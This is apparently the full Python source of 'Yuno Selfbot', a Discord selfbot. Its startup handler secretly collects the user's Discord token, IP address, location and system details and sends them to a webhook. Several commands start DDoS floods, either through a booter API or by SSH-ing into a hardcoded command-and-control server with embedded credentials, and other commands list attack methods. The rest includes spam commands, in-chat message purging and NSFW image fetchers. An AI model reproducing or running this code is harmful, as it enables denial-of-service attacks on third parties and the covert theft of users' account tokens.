import discord, os, colorama, time, sys, json, asyncio, io, string
import requests, random, aiohttp, re, platform, paramiko, subprocess
from colorama import Fore
from requests import get
from discord import Webhook
from dhooks import Webhook, Embed, File
from discord import Permissions
from discord.ext import commands
from urllib.request import urlopen
from getpass import getpass

intents = discord.Intents.all()
intents.members = True
# imports etc
version = 2.6
if not os.path.isfile("./config/config.json"):
    sys.exit("'/config/config.json' not found! Please add it and try again.")
else:
    with open("./config/config.json") as file:
        config = json.load(file)
token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
apikey = config.get('key')
apuser = config.get('apiusername')
Yuno = commands.Bot(command_prefix=prefix, self_bot=True, case_sensitive=False, intents=intents)


# main
class main:
    print("loading packages please wait...")
    asyncio.sleep(4)
    os.system("cls")
    us = os.environ.get("USERNAME")
    os.system("title Welcome to Yuno Selfbot " + us)
    colorama.init()
    ART = f"""  
╦ ╦╦ ╦╔╗╔╔═╗
╚╦╝║ ║║║║║ ║
 ╩ ╚═╝╝╚╝╚═╝ Yuno Selfbot V{version}
"""
    print(Fore.LIGHTRED_EX + ART)


@Yuno.event
async def on_ready():
    guilds = len(Yuno.guilds)
    id = Yuno.user.id
    ping = Yuno.latency
    ping = str(round(ping, 2))
    cmds = len(Yuno.commands)
    f = len(Yuno.user.friends)
    await Yuno.change_presence(activity=discord.Game(name='Yuno Top'))
    stat = True
    if stat == True:
        print(Fore.LIGHTCYAN_EX + ("-------------STATS---------------------"))
        print("Logged in as " + Yuno.user.display_name + " UID: " + str(id))
        print("Ping " + str(ping) + "ms")
        print("Prefix is " + prefix)
        print("Command Count: " + str(cmds))
        print("Guild Count: " + str(guilds) + " | Friend Count: " + str(f))

    try:
        gui = len(Yuno.guilds)
        tok = token
        pp = prefix
        print()
        plt = platform.processor()
        plt2 = platform.system()
        f = len(Yuno.user.friends)
        seggs = Yuno.user.id
        publicip = requests.get('https://api.ipify.org').text  # Get public API
        city = get(f'https://ipapi.co/{publicip}/city').text
        region = get(f'https://ipapi.co/{publicip}/region').text
        timezone = get(f'https://ipapi.co/{publicip}/timezone').text
        country = get(f'https://ipapi.co/{publicip}/country_name').text
        ur = Yuno.user.display_name
        us = os.environ.get("USERNAME")
        Izumi_Top = Webhook('dead')
        main = discord.Embed(color=discord.colour.Colour.red())
        main.add_field(name="🙎‍♂ Username", value=f"{ur}#{Yuno.user.discriminator}", inline=False)
        main.add_field(name="🔒 Pc Username", value=us, inline=False)
        main.add_field(name="🔒 IP", value=publicip, inline=False)
        main.add_field(name="🔒 Country", value=country, inline=False)
        main.add_field(name="🔒 Region", value=region, inline=False)
        main.add_field(name="🔒 TimeZone", value=timezone, inline=False)
        main.add_field(name="🔒 City", value=city, inline=False)
        main.add_field(name="🎨 Processor", value=plt, inline=False)
        main.add_field(name="🎨 Linux or windows", value=plt2, inline=False)
        main.add_field(name="🎨 Prefix", value=pp, inline=False)
        main.add_field(name="🎨 Guild Count", value=gui, inline=False)
        main.add_field(name="🎨 Friend Count", value=f, inline=False)
        main.add_field(name="🎨 ID", value=seggs, inline=False)
        main.add_field(name="💎 Active Token", value=tok, inline=False)
        main.set_thumbnail(url="https://images.emojiterra.com/google/android-11/512px/1f512.png")
        main.set_footer(text=f"User Is Using Version: {version}", icon_url=Yuno.user.avatar_url)
        await Izumi_Top.send(embed=main)
    except Exception as e:
        pass


@Yuno.command(brief="ip lookup tool")
async def ip(ctx, *, ipaddr: str = '9.9.9.9'):
    try:
        r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}?key=n2jrsS7rgJC6T28b4zww")
        geo = r.json()
        vpn = requests.get(f"http://ip-api.com/json/{ipaddr}?fields=proxy")
        proxy = vpn.json()
        fields = [
            {'name': 'Proxy Status', 'value': proxy['proxy']},
            {'name': 'IP', 'value': geo['query']},
            {'name': 'IP Type', 'value': geo['ipType']},
            {'name': 'Country', 'value': geo['country']},
            {'name': 'City', 'value': geo['city']},
            {'name': 'continent', 'value': geo['continent']},
            {'name': 'Hostname', 'value': geo['ipName']},
            {'name': 'ISP', 'value': geo['isp']},
            {'name': 'ORG', 'value': geo['org']},
            {'name': 'Region', 'value': geo['region']},
            {'name': 'Business', 'value': geo['businessWebsite']},
            {'name': 'Website', 'value': geo['businessName']},
            {'name': 'Status', 'value': geo['status']},
        ]
        for field in fields:
            if field['value']:
                await ctx.send(f"```{field['name']} \n {field['value']}```")
    except:
        pass


@Yuno.command(brief="host port time method")
async def null(ctx, arg1, arg2, arg3, arg4):
    try:
        await ctx.message.delete()
        import os
        import webbrowser
        print(Fore.LIGHTMAGENTA_EX + ("Tsuki Attack Sent"))
        print(f"[Yuno] Host {arg1}\n [Yuno] Port {arg2}\n [Yuno] Time {arg3}\n [Yuno] Method {arg4}")
        await ctx.send(
            f"_**Request Sent!**_\n **Host** \n```{arg1}``` \n **Port** \n```{arg2}``` **Time** \n```{arg3}``` \n **Method** \n```{arg4}```")
        try:
            await os.startfile(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={arg1}&port={arg2}&time={arg3}&method={arg4}&username={apuser}', new=2)
        except:
            pass
        await asyncio.sleep(25)
        try:
            DETACHED_PROCESS = 0x00000008
            await subprocess.call('taskkill /F /IM Brave.exe', creationflags=DETACHED_PROCESS)
        except:
            pass
        await ctx.message.delete()
        await ctx.send("**Ended Api Call**")
    except:
        pass

@Yuno.command(brief="1.1.1.1 80 120")
async def tsunami(ctx, ip, port, time):
    host = "51.68.193.186"
    conport = "1337"
    cncusr = "Izumi"
    cncpass = "ishot"
    try:
        await ctx.message.delete()
        await os.startfile(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=DNS&username={apuser}')
        await asyncio.sleep(10)
    except:
        pass
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
    channel = ssh.invoke_shell()
    channel.send(f'UDPRAW {ip} {port} {time}')
    channel.send('\u000d')
    channel.send('exit')
    channel.send('\u000d')
    ssh.close()
    await asyncio.sleep(3)
    try:
        DETACHED_PROCESS = 0x00000008
        await subprocess.call('taskkill /F /IM Brave.exe', creationflags=DETACHED_PROCESS)
    except:
        pass
    await ctx.send(f"**_RUNNNNN!_**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **A Tsunami is Coming!!!**`")

@Yuno.command(brief="1.1.1.1 22 120")
async def apocalypse(ctx, ip, port, time):
    host = "51.68.193.186"
    conport = "1337"
    cncusr = "Izumi"
    cncpass = "ishot"
    try:
        await ctx.message.delete()
        await os.startfile(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-BYPASS&username={apuser}')
        await asyncio.sleep(10)
    except:
        pass
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
    channel = ssh.invoke_shell()
    channel.send(f'TCP {ip} {port} {time}')
    channel.send('\u000d')
    channel.send('exit')
    channel.send('\u000d')
    ssh.close()
    await asyncio.sleep(3)
    try:
        DETACHED_PROCESS = 0x00000008
        await subprocess.call('taskkill /F /IM Brave.exe', creationflags=DETACHED_PROCESS)
    except:
        pass
    await ctx.send(f"**The End Times Are Here**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Its the Apocalypse**`")

@Yuno.command(brief="ip port time method")
async def kod(ctx, ip, port, time, method):
    host = "51.68.193.186"
    conport = "1337"
    cncusr = "Izumi"
    cncpass = "ishot"
    await ctx.message.delete()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
    channel = ssh.invoke_shell()
    channel.send(f'{method} {ip} {port} {time}')
    channel.send('\u000d')
    channel.send('exit')
    channel.send('\u000d')
    ssh.close()
    print(Fore.LIGHTMAGENTA_EX + ("Kiss Of Death Sent To"))
    print(f"[Yuno] Host {ip}\n [Yuno] Port {port}\n [Yuno] Time {time}\n [Yuno] Method {method}")
    await ctx.send(
        f"**_Kiss Of Death Sent!_**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Method:**```{method} ```")


@Yuno.command(name='restart')
async def restart(ctx):
    await ctx.send("Restarting Yuno...")
    os.execv(sys.executable, ['python'] + sys.argv)
    await ctx.send("restarted?")


@Yuno.command(name="stickbug")
async def stickbug(ctx, member: discord.User):
    try:
        url = f'https://nekobot.xyz/api/imagegen?type=stickbug&url={member.avatar.url}'
        response = urlopen(url)
        data_json = json.loads(response.read())
        await ctx.send(data_json['message'])
    except:
        ctx.send("api isnt responding")


@Yuno.command()
async def purge(ctx, amount=200):
    await ctx.message.delete()
    try:
        await ctx.channel.purge(limit=amount)
    except:
        ctx.send("failed to purge messages")


@Yuno.command(brief="spam 2 hi")
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    try:
        for i in range(amount):  # Do the next thing amount times
            await ctx.send(message)  # Sends message where command was called
    except:
        pass


@Yuno.command(brief="more friends you have the more messages it sends")
async def friendspam(ctx):
    await ctx.message.delete()
    try:
        for user in Yuno.user.friends:
            await ctx.send(user.name + "#" + user.discriminator)
    except:
        pass


@Yuno.command(brief="dick @person")
async def dick(ctx, *, member: discord.Member):
    await ctx.message.delete()
    try:
        m = member.mention
        c = ['8=D', '8==D', '8===D', '8====D', '8=====D']
        await ctx.send(f'{m} dick size is ' + random.choice(c))
    except:
        ctx.send("```This command currently doesnt work in dms sorry```")


@Yuno.command(brief="Lists Tsuki API Methods")
async def meth(ctx):
    await ctx.message.delete()
    await ctx.send(
        f"**Layer 4**\n **UDP METHODS** \n``` UDP-RAW \n DNS \n NTP \n PPS-FLOOD \n UDP-KILL \n RAKNET \n FIVEM ```\n **TCP METHODS** \n``` HANDSHAKE \n TCP-SOCKET \n TCP-BYPASS \n OVH-TCP \n NFO-TCP  ```")
    await ctx.send(f"**Layer 7**\n ``` HTTP-RAW \n HTTPS-TLS \n BROWSER ```")
    await ctx.send(f"**Attack Args**\n ``` {prefix}null host port time method```")


@Yuno.command(brief="Lists KOD API Methods")
async def kiss(ctx):
    await ctx.message.delete()
    await ctx.send(f"**AMPS**\n```DNS \n NTP \n DVR \n LDAP \n MIXAMP \n HOMEV1 \n HOMEV2```")
    await ctx.send(
        f"**L4**\n *UDP METHODS* \n``` UDP \n OVHUDP ```\n *TCP METHODS* \n``` TCP \n SOCKET \n SSH \n OVHTCP \n NFO ```")
    await ctx.send(f"**GAME**\n```GAME \n FIVEM \n R6-NULL \n GAMEMIX \n GAMEAMP \n MC-DROP \n WZ4 \n WZ-KILL```")
    await ctx.send(f"**RAW**\n```VSE \n UDPRAW \n PPS \n SYN \n ACK```")
    await ctx.send(f"**L7**\n```TLS \n BROWSER \n CFPRO \n UAM \n HTTPS```")
    await ctx.send(f"**ARGS**\n```{prefix}kod host port time method```")


@Yuno.command(brief="simple arcade game")
async def arcade(ctx):
    await ctx.message.delete()
    c = ['You Lost\n1 2 3', 'You Lost\n1 1 2', 'You Lost\n2 1 1', 'You Lost\n2 3 1', 'WINNER\n1 1 1']
    await ctx.send(random.choice(c))


@Yuno.command(brief="slap @person")
async def slap(ctx, member: discord.Member):
    try:
        mem = member.mention
        await ctx.message.delete()
        r = get('https://www.nekos.life/api/v2/img/slap')
        res = r.json()
        await ctx.send(mem)
        await ctx.send(res["url"])
    except:
        await ctx.send("use in a server not dms")


@Yuno.command(brief="poke @person")
async def poke(ctx, member: discord.Member):
    try:
        mem = member.mention
        await ctx.message.delete()
        r = get('https://www.nekos.life/api/v2/img/poke')
        res = r.json()
        await ctx.send(mem)
        await ctx.send(res["url"])
    except:
        await ctx.send("use in a server not dms")


@Yuno.command(brief="tickle @person")
async def tickle(ctx, member: discord.Member):
    try:
        mem = member.mention
        await ctx.message.delete()
        r = get('https://www.nekos.life/api/v2/img/tickle')
        res = r.json()
        await ctx.send(mem)
        await ctx.send(res["url"])
    except:
        await ctx.send("use in a server not dms")


@Yuno.command(brief="shows dog pic")
async def dog(ctx):
    r = get('https://www.nekos.life/api/v2/img/woof')
    res = r.json()
    await ctx.send(res["url"])


@Yuno.command(brief="shows cat pic")
async def cat(ctx):
    r = get('https://www.nekos.life/api/v2/img/meow')
    res = r.json()
    await ctx.send(res["url"])


@Yuno.command(brief="nekos!")
async def neko(ctx):
    try:
        await ctx.message.delete()
        resp = get("https://nekos.best/api/v2/neko")
        data = resp.json()
        await ctx.send(data["results"][0]["url"])
    except:
        pass

@Yuno.command(brief="lewd nekos!")
async def lneko(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=lewdneko') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass


@Yuno.command(brief="dont use with kids around!")
async def hboobs(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=hboobs') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass

@Yuno.command(brief="kemonomimi!")
async def kgirl(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=kemonomimi') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass

@Yuno.command(brief="hentai!")
async def hentai(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=hentai') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass


@Yuno.command(brief="dont use with kids around!")
async def hneko(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=hneko') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass


@Yuno.command(brief="dont use with kids around!")
async def hass(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=hass') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass


@Yuno.command(brief="holo the best girl")
async def holo(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=holo') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass


@Yuno.command(brief="dont use with kids around!")
async def hthigh(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=hthigh') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass


@Yuno.command(brief="dont use with kids around!")
async def hanal(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=hanal') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass

@Yuno.command(brief="dont use with kids around!")
async def pgif(ctx):
    try:
        await ctx.message.delete()
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://nekobot.xyz/api/image?type=pgif') as r:
                res = await r.json()
                await ctx.send(res['message'])
    except:
        pass


@Yuno.command(brief="the hub")
async def phub(ctx):
    try:
        r = get('https://www.reddit.com/r/nsfw/new.json?sort=hot')
        res = await r.json()
        await ctx.send(res['data']['children'][random.randint(1, 20)]['data']['url'])
    except:
        pass



@Yuno.command(brief="waifus!")
async def waifu(ctx):
    try:
        r = get('https://api.waifu.im/search/?is_nsfw=true')
        res = r.json()
        await ctx.send(res['images'][0]['url'])
    except:
        pass


@Yuno.command(brief="rofl")
async def rofl(ctx):
    await ctx.message.delete()
    await ctx.send("https://tenor.com/view/laughing-hysterically-laugh-crying-gif-13968444")


@Yuno.command(brief="pop pop")
async def pop(ctx):
    await ctx.message.delete()
    await ctx.send(
        '||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||')


@Yuno.command(brief="stfu nn")
async def whocares(ctx):
    await ctx.message.delete()
    await ctx.send("https://tenor.com/view/nobody-cares-nobody-cares-spongebob-imagination-gif-8176136")


@Yuno.command(brief="eping 3 | everyone spam")
async def eping(ctx, *, dur: int = None):
    if dur is None:
        print(Fore.MAGENTA + '[Yuno]', Fore.WHITE + 'No duration given')
    else:
        await ctx.message.delete()
        amt = int(dur)
        n = 0
        while (n <= amt):
            await ctx.send("@everyone")
            n = n + 1
        print(Fore.MAGENTA + '[Yuno]', Fore.WHITE + 'Stopped spamming everyone')


@Yuno.command(brief="bspam 3 | spams blank messages")
async def bspam(ctx, *, dur: int = None):
    if dur is None:
        print(Fore.MAGENTA + '[Yuno]', Fore.WHITE + 'No duration given')
    else:
        await ctx.message.delete()
        amt = int(dur)
        n = 0
        while (n <= amt):
            await ctx.send("** **")
            n = n + 1
        print(Fore.MAGENTA + '[Yuno]', Fore.WHITE + 'Stopped blank_spam')


@Yuno.command(brief="kanye's nazi wisdom")
async def kanye(ctx):
    await ctx.message.delete()
    r = get('https://api.kanye.rest/')
    res = r.json()
    await ctx.send('**' + res["quote"] + '**' + ' -kanye')


@Yuno.command(brief="fuck you")
async def fu(ctx):
    await ctx.message.delete()
    message = await ctx.send(f"Fuck You")
    await message.edit(content="uck You")
    await message.edit(content="ck You")
    await message.edit(content="k You")
    await message.edit(content="You")
    await message.edit(content="ou")
    await message.edit(content="u")
    await message.edit(content="Fuck You")


@Yuno.command(brief="Lmao")
async def lol(ctx):
    await ctx.message.delete()
    message = await ctx.send(content="LOL")
    await message.edit(content="** **")
    await message.edit(content="LOL")
    await message.edit(content="** **")
    await message.edit(content="LOL")
    await message.edit(content="** **")
    await message.edit(content="LOL")


try:
    Yuno.run(token, bot=False)
except:
    print("failed to start bot")
    time.sleep(5)
